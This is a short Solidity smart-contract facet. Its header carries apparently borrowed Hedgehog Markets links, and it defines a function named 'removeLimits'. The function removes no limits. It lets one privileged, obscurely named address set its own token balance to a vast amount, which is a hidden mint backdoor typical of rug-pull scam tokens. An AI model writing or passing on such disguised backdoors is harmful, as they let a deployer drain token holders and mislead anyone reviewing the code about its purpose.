/*
 * SPDX-License-Identifier: MIT
 * Website: https://hedgehog.markets/#/?utm_source=icodrops
 * Twitter: https://twitter.com/HedgehogMarket
 * Telegram: https://t.me/hedgehogmarkets
 * discord: https://discord.gg/vt8Dw5SN58
 */
pragma solidity ^0.8.19;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
